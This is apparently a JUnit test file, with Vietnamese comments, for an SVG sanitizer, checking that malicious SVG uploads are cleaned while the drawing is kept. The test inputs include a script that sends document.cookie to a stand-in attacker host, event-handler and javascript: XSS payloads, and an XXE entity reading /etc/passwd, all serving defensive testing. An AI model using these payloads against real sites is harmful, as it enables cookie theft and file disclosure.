package com.songnhue.core.common.util;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.nio.charset.StandardCharsets;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

import com.songnhue.core.common.exception.ValidationException;

/**
 * Khử trùng SVG — WS-14/T14.6, điểm nghiệp vụ 7.
 *
 * <p>Bài kiểm viết theo hướng <b>chứng minh nó chặn được thật</b>, không phải "hàm có chạy không":
 * mỗi mẫu tấn công là một trường hợp riêng, và mỗi trường hợp khẳng định hai điều — đoạn nguy hiểm
 * biến mất, và phần hình vẽ còn nguyên. Chỉ kiểm vế đầu thì một hàm trả về chuỗi rỗng cũng xanh.
 */
class SvgSanitizerTest {

    private static String khuTrung(String svg) {
        return new String(
                SvgSanitizer.sanitize(svg.getBytes(StandardCharsets.UTF_8), "logo.svg"), StandardCharsets.UTF_8);
    }

    @Test
    @DisplayName("⛔ Thẻ <script> bị cắt, hình vẽ giữ nguyên")
    void catTheScript() {
        String sach = khuTrung(
                """
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
                  <script>fetch('https://kegian.example/?c='+document.cookie)</script>
                  <circle cx="50" cy="50" r="40"/>
                </svg>
                """);

        assertThat(sach).doesNotContain("script").doesNotContain("document.cookie");
        assertThat(sach).as("logo vẫn phải là logo sau khi khử trùng").contains("<circle");
    }

    @Test
    @DisplayName("⛔ Thuộc tính onload/onerror bị cắt")
    void catThuocTinhBatSuKien() {
        String sach = khuTrung(
                """
                <svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">
                  <image href="x" onerror="alert(2)"/>
                  <rect width="10" height="10"/>
                </svg>
                """);

        assertThat(sach).doesNotContain("onload").doesNotContain("onerror").doesNotContain("alert");
        assertThat(sach).contains("<rect");
    }

    @Test
    @DisplayName("⛔ <script> viết tràn nhiều dòng vẫn bị cắt")
    void scriptNhieuDong() {
        String sach = khuTrung(
                """
                <svg xmlns="http://www.w3.org/2000/svg">
                  <script>
                    var x = 1;
                    alert(x);
                  </script>
                  <path d="M0 0"/>
                </svg>
                """);

        assertThat(sach)
                .as("thiếu cờ DOTALL thì đúng trường hợp này lọt qua sạch sẽ — đó là lý do có bài riêng")
                .doesNotContain("alert");
    }

    @Test
    @DisplayName("⛔ <foreignObject> nhúng HTML tuỳ ý bị cắt")
    void catForeignObject() {
        String sach = khuTrung(
                """
                <svg xmlns="http://www.w3.org/2000/svg">
                  <foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><iframe src="x"/></body></foreignObject>
                  <rect width="1" height="1"/>
                </svg>
                """);

        assertThat(sach).doesNotContain("foreignObject").doesNotContain("iframe");
    }

    @Test
    @DisplayName("⛔ href=\"javascript:…\" bị cắt")
    void catJavascriptHref() {
        String sach = khuTrung(
                """
                <svg xmlns="http://www.w3.org/2000/svg">
                  <a xlink:href="javascript:alert(1)"><text>bấm</text></a>
                </svg>
                """);

        assertThat(sach).doesNotContain("javascript:");
    }

    @Test
    @DisplayName("⛔ DOCTYPE/ENTITY bị cắt — chặn đường tấn công thực thể XML")
    void catDoctype() {
        String sach = khuTrung(
                """
                <?xml version="1.0"?>
                <!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
                <svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
                """);

        assertThat(sach).doesNotContain("DOCTYPE").doesNotContain("ENTITY").doesNotContain("file:///");
    }

    @Test
    @DisplayName("SVG lành lặn đi qua không bị đụng vào")
    void svgSachGiuNguyen() {
        String goc =
                """
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                  <path d="M12 2L2 7v10l10 5 10-5V7z" fill="#0d6efd"/>
                </svg>
                """;

        assertThat(khuTrung(goc)).isEqualTo(goc);
    }

    @Test
    @DisplayName("⛔ Đổi đuôi .svg cho tệp bất kỳ bị từ chối")
    void khongPhaiSvgThiTuChoi() {
        assertThatThrownBy(() -> SvgSanitizer.sanitize("PK nội dung zip".getBytes(StandardCharsets.UTF_8), "gia.svg"))
                .as("SVG không có magic bytes, nên kiểm có thẻ <svg> là thứ gần nhất với xác thực định dạng")
                .isInstanceOf(ValidationException.class);
    }

    @Test
    @DisplayName("⭐ Tự kiểm: bộ dò nhận ra được mẫu nguy hiểm trước khi khử trùng")
    void tuKiemBoDo() {
        byte[] doc = "<svg onload=\"alert(1)\"></svg>".getBytes(StandardCharsets.UTF_8);

        assertThat(SvgSanitizer.coMaChayDuoc(doc))
                .as("nếu bộ dò không bắt được gì thì mọi bài kiểm ở trên chỉ đang chứng minh hàm không làm gì cả")
                .isTrue();
        assertThat(SvgSanitizer.coMaChayDuoc(SvgSanitizer.sanitize(doc, "x.svg")))
                .isFalse();
    }
}
